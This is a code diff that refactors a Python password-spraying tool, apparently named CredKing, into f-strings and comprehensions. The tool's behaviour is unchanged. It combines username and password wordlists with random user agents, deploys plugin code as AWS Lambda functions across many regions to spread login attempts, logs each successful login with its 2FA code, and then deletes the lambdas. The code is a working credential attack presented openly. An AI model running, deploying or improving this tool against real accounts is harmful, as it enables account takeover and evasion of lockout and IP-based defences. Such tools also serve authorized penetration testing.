@@ -37,25 +37,25 @@ def main(args,pargs):
 	useragent_file = args.useragentfile
 
 	pluginargs = {}
-	for i in range(0,len(pargs)-1):
+	for i in range(len(pargs)-1):
 		key = pargs[i].replace("--","")
 		pluginargs[key] = pargs[i+1]
 
 	start_time = datetime.datetime.utcnow()
-	log_entry('Execution started at: {}'.format(start_time))
+	log_entry(f'Execution started at: {start_time}')
 
 	# Prepare credential combinations into the queue
 	load_credentials(username_file, password_file, useragent_file)
 
 	# Check with plugin to make sure it has the data that it needs
-	validator = importlib.import_module('plugins.{}'.format(plugin))
+	validator = importlib.import_module(f'plugins.{plugin}')
 	if getattr(validator,"validate",None) is not None:
 		valid,errormsg = validator.validate(pluginargs)
 		if not valid:
 			log_entry(errormsg)
 			return
 	else:
-		log_entry("No validate function found for plugin: {}".format(plugin))
+		log_entry(f"No validate function found for plugin: {plugin}")
 
 	# Prepare the deployment package
 	zip_path = create_zip(plugin)
@@ -69,7 +69,7 @@ def main(args,pargs):
 	# Start Spray
 	with ThreadPoolExecutor(max_workers=len(arns)) as executor:
 		for arn in arns:
-			log_entry('Launching spray using {}...'.format(arn))
+			log_entry(f'Launching spray using {arn}...')
 			executor.submit(
 				start_spray,
 				access_key=access_key,
@@ -92,19 +92,15 @@ def main(args,pargs):
 
 def display_stats(start=True):
 	if start:
-		lambda_count = 0
-		for lc, val in lambda_clients.items():
-			if val:
-				lambda_count += 1
-
-		log_entry('User/Password Combinations: {}'.format(len(credentials['accounts'])))
-		log_entry('Total Regions Available: {}'.format(len(regions)))
-		log_entry('Total Lambdas: {}'.format(lambda_count))
-		
+		lambda_count = sum(bool(val) for lc, val in lambda_clients.items())
+		log_entry(f"User/Password Combinations: {len(credentials['accounts'])}")
+		log_entry(f'Total Regions Available: {len(regions)}')
+		log_entry(f'Total Lambdas: {lambda_count}')
+				
 
 	if end_time and not start:
-		log_entry('End Time: {}'.format(end_time))
-		log_entry('Total Execution: {} seconds'.format(time_lapse))
+		log_entry(f'End Time: {end_time}')
+		log_entry(f'Total Execution: {time_lapse} seconds')
 
 
 def start_spray(access_key, secret_access_key, arn, args):
@@ -114,11 +110,12 @@ def start_spray(access_key, secret_access_key, arn, args):
 		if item is None:
 			break
 
-		payload = {}
-		payload['username'] = item['username']
-		payload['password'] = item['password']
-		payload['useragent'] = item['useragent']
-		payload['args'] = args
+		payload = {
+			'username': item['username'],
+			'password': item['password'],
+			'useragent': item['useragent'],
+			'args': args,
+		}
 
 		invoke_lambda(
 			access_key=access_key,
@@ -132,17 +129,16 @@ def start_spray(access_key, secret_access_key, arn, args):
 
 def clear_credentials(username, password):
 	global credentials
-	c = {}
-	c['accounts'] = []
+	c = {'accounts': []}
 	for x in credentials['accounts']:
-		if not x['username'] == username:
+		if x['username'] != username:
 			x['success'] = True
 			c['accounts'].append(x)
 	credentials = c
 
 
 def load_credentials(user_file, password_file,useragent_file=None):
-	log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
+	log_entry(f'Loading credentials from {user_file} and {password_file}')
 
 	users = load_file(user_file)
 	passwords = load_file(password_file)
@@ -153,10 +149,12 @@ def load_credentials(user_file, password_file,useragent_file=None):
 
 	for user in users:
 		for password in passwords:
-			cred = {}
-			cred['username'] = user
-			cred['password'] = password
-			cred['useragent'] = random.choice(useragents)
+			cred = {
+				'username': user,
+				'password': password,
+				'useragent': random.choice(useragents),
+			}
+
 			credentials['accounts'].append(cred)
 
 	for cred in credentials['accounts']:
@@ -169,13 +167,8 @@ def load_file(filename):
 
 
 def load_zips(thread_count):
-	if thread_count > len(regions):
-		thread_count = len(regions)
-
-	use_regions = []
-	for r in range(0, thread_count):
-		use_regions.append(regions[r])
-
+	thread_count = min(thread_count, len(regions))
+	use_regions = [regions[r] for r in range(thread_count)]
 	with ThreadPoolExecutor(max_workers=thread_count) as executor:
 		for region in use_regions:
 			zip_list.add(
@@ -190,24 +183,21 @@ def load_zips(thread_count):
 def load_lambdas(access_key, secret_access_key, thread_count, zip_path):
 	threads = thread_count
 
-	if thread_count > len(regions):
-		threads = len(regions)
-
-	if threads > len(credentials['accounts']):
-		threads = len(credentials['accounts'])
-
+	threads = min(threads, len(regions))
+	threads = min(threads, len(credentials['accounts']))
 	arns = []
 	with ThreadPoolExecutor(max_workers=threads) as executor:
-		for x in range(0,threads):
-			arns.append(
-				executor.submit(
-					create_lambda,
-					zip_path=zip_path,
-					access_key=access_key,
-					secret_access_key=secret_access_key,
-					region_idx=x,
-				)
+		arns.extend(
+			executor.submit(
+				create_lambda,
+				zip_path=zip_path,
+				access_key=access_key,
+				secret_access_key=secret_access_key,
+				region_idx=x,
 			)
+			for x in range(threads)
+		)
+
 	return [x.result() for x in arns]
 
 
@@ -219,14 +209,14 @@ def generate_random():
 
 
 def create_zip(plugin):
-	plugin_path = 'plugins/{}/'.format(plugin)
+	plugin_path = f'plugins/{plugin}/'
 	random_name = next(generate_random())
-	build_zip = 'build/{}_{}.zip'.format(plugin, random_name)
-	
+	build_zip = f'build/{plugin}_{random_name}.zip'
+
 	with lock:
-		log_entry('Creating build deployment for plugin: {}'.format(plugin))
-		shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)
-	
+		log_entry(f'Creating build deployment for plugin: {plugin}')
+		shutil.make_archive(build_zip[:-4], 'zip', plugin_path)
+
 	return build_zip
 
 
@@ -256,9 +246,8 @@ def init_client(service_type, access_key, secret_access_key, region_name):
 	ck_client = None
 
 	# Reuse Lambda lambda_clients
-	if service_type == 'lambda':
-		if region_name in lambda_clients.keys():
-			return lambda_clients[region_name]
+	if service_type == 'lambda' and region_name in lambda_clients.keys():
+		return lambda_clients[region_name]
 
 	with lock:
 		ck_client = boto3.client(
@@ -301,8 +290,8 @@ def create_role(access_key, secret_access_key, region_name):
 	for current_role in check_roles:
 		arn = current_role['Arn']
 		role_name = current_role['RoleName']
-		
-		if 'CredKing_Role' == role_name:
+
+		if role_name == 'CredKing_Role':
 			return arn
 
 	role_response = client.create_role(RoleName='CredKing_Role',
@@ -318,7 +307,7 @@ def create_lambda(access_key, secret_access_key, zip_path, region_idx):
 	build_file = tail.split('.')[0]
 	plugin_name = build_file.split('_')[0]
 
-	handler_name = '{}.lambda_handler'.format(plugin_name)
+	handler_name = f'{plugin_name}.lambda_handler'
 	zip_data = None
 
 	with open(zip_path,'rb') as fh:
@@ -343,12 +332,12 @@ def create_lambda(access_key, secret_access_key, zip_path, region_idx):
 				},
 			)
 
-		log_entry('Created lambda {} in {}'.format(response['FunctionArn'], region))
+		log_entry(f"Created lambda {response['FunctionArn']} in {region}")
 
 		return response['FunctionArn']
 
 	except Exception as ex:
-		log_entry('Error creating lambda using {} in {}: {}'.format(zip_path, region, ex))
+		log_entry(f'Error creating lambda using {zip_path} in {region}: {ex}')
 		return None
 
 
@@ -373,14 +362,14 @@ def invoke_lambda(access_key, secret_access_key, arn, payload):
 	if return_payload['success'] == True:
 		clear_credentials(user, password)
 
-		log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
+		log_entry(f'(SUCCESS) {user} / {password} -> Success! (2FA: {code_2fa})')
 	else:
-		log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))
+		log_entry(f'(FAILED) {user} / {password} -> Failed.')
 		
 
 def log_entry(entry):
 	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-	print('[{}] {}'.format(ts, entry))
+	print(f'[{ts}] {entry}')
 
 
 def clean_up(access_key, secret_access_key, only_lambdas=True):
@@ -389,26 +378,23 @@ def clean_up(access_key, secret_access_key, only_lambdas=True):
 		client.delete_role(RoleName='CredKing_Role')
 
 	for client_name, client in lambda_clients.items():
-		log_entry('Cleaning up lambdas in {}...'.format(client.meta.region_name))
+		log_entry(f'Cleaning up lambdas in {client.meta.region_name}...')
 
 		try:
-			lambdas_functions = client.list_functions(
-				FunctionVersion='ALL',
-				MaxItems=1000
-			)
-
-			if lambdas_functions:
+			if lambdas_functions := client.list_functions(
+				FunctionVersion='ALL', MaxItems=1000
+			):
 				for lambda_function in lambdas_functions['Functions']:
-					if not '$LATEST' in lambda_function['FunctionArn']:
+					if '$LATEST' not in lambda_function['FunctionArn']:
 						lambda_name = lambda_function['FunctionName']
 						arn = lambda_function['FunctionArn']
 						try:
-							log_entry('Destroying {} in region: {}'.format(arn, client.meta.region_name))
+							log_entry(f'Destroying {arn} in region: {client.meta.region_name}')
 							client.delete_function(FunctionName=lambda_name)
 						except:
-							log_entry('Failed to clean-up {} using client region {}'.format(arn, region))
-		except:			
-			log_entry('Failed to connect to client region {}'.format(region))
+							log_entry(f'Failed to clean-up {arn} using client region {region}')
+		except:
+			log_entry(f'Failed to connect to client region {region}')
 
 	filelist = [ f for f in os.listdir('build') if f.endswith(".zip") ]
 	for f in filelist:
